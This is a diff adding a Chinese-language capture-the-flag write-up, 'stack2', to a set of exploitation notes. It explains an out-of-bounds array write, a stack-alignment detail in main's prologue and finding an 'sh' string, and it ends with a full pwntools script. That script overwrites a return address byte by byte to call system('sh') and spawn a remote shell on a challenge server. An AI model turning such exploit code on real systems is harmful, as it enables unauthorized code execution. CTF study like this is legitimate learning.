@@ -1033,3 +1033,50 @@ sh.send(payload.ljust(200, b'a'))
 data = sh.recvuntil('\n')
 sh.interactive()
 ```
+
+### stack2
+题目：暂无
+
+思路：漏洞点在于数组越界，导致可以写任意地址。
+
+存在两个坑，一个是在覆盖main函数的返回地址时没有注意，直接使用常规栈帧计算，一直没有效果，查看wp发现返回地址不是在ebp之下，而是存在一段距离，仔细查看了汇编代码才发现在push ebp之前还有几条指令。
+```asm
+.text:080485D0                 lea     ecx, [esp+4]
+.text:080485D4                 and     esp, 0FFFFFFF0h
+.text:080485D7                 push    dword ptr [ecx-4]
+.text:080485DA                 push    ebp
+.text:080485DB                 mov     ebp, esp
+```
+将esp按16字节对齐，因此栈顶会抬高一段距离，具体通过调试可以知道。此后还需要将对齐之前的栈顶压栈，用于恢复。
+
+第二个坑在于返回到hack函数的时候提示没有/bin/bash这个命令。有两个解决办法，第一个是通过```ROPgadget --binary  3fb1a42837be485aae7d85d11fbc457b --string "sh"```查找sh字符串，然后将返回地址和参数覆盖为system.plt和sh的地址，如果不行的话可以通过rop的方式，利用scanf函数手动写入/bin/sh字符串到bss段，然后继续rop调用system("/bin/sh")。
+
+全部代码如下：
+```python
+from pwn import *
+
+sh = remote("220.249.52.133", 34088)
+
+sh.recvuntil(":\n")
+sh.sendline("1")
+sh.sendline("1")
+
+def writeByte(index, data):
+    sh.recvuntil("exit\n")
+    sh.sendline("3")
+    sh.sendlineafter(":\n", "%d" % index)
+    sh.sendlineafter(":\n", "%d" % data)
+
+systemAddr = 0x08048450
+shAddr = 0x08048987
+payload = p32(systemAddr) + b'AAAA' + p32(shAddr)
+index = 132
+print(payload)
+for i in payload:
+    writeByte(index, i)
+    index += 1
+
+data = sh.sendlineafter("exit\n", "5")
+print(data)
+sh.interactive()
+```
